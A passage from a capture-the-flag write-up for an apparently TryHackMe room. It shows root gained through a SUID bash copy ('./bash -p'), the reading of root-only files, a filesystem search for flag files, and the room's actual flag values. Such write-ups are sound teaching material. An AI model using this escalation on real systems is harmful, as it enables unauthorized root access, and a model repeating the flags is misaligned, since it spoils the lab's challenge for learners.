-rw-------. 1 james james      38 Nov 17  2020 user.flag
[james@localhost ~]$ ./bash -p
bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),1000(james)
bash-4.4# 
```

## Last flags
We already got the user flag from the home directory of `james`.

With the root privileges we can now find the root flag:
```
bash-4.4# cd /root
bash-4.4# ls -al 
total 24
dr-x------.  3 root root 141 Nov 17  2020 .
drwxr-xr-x. 17 root root 244 Nov 18  2020 ..
lrwxrwxrwx.  1 root root   9 Nov  8  2020 .bash_history -> /dev/null
-rw-------.  1 root root  18 May 11  2019 .bash_logout
-rw-------.  1 root root 176 May 11  2019 .bash_profile
-rw-------.  1 root root 176 May 11  2019 .bashrc
-rw-------.  1 root root 100 May 11  2019 .cshrc
-rw-------.  1 root root  38 Nov 17  2020 root.flag
drwxr-xr-x   2 root root  29 Nov 17  2020 .ssh
-rw-------.  1 root root 129 May 11  2019 .tcshrc
bash-4.4# cat root.flag 
thm{a4f6adb70371a4bceb32988417456c44}
bash-4.4# 
```

The last flag is the web flag. Since we know the scheme of the flag naming we can search for it:
```
bash-4.4# find / -name "*.flag" 2>/dev/null
/root/root.flag
/usr/share/httpd/web.flag
/home/james/user.flag
bash-4.4# ls -al /usr/share/httpd/web.flag
-rw-r--r--. 1 root root 38 Nov 17  2020 /usr/share/httpd/web.flag
bash-4.4# 
bash-4.4# cat /usr/share/httpd/web.flag
thm{0ae72f7870c3687129f7a824194be09d}
bash-4.4# 
```
That flag could be also found as the initial `apache` user.

With that three flags, the room is completed.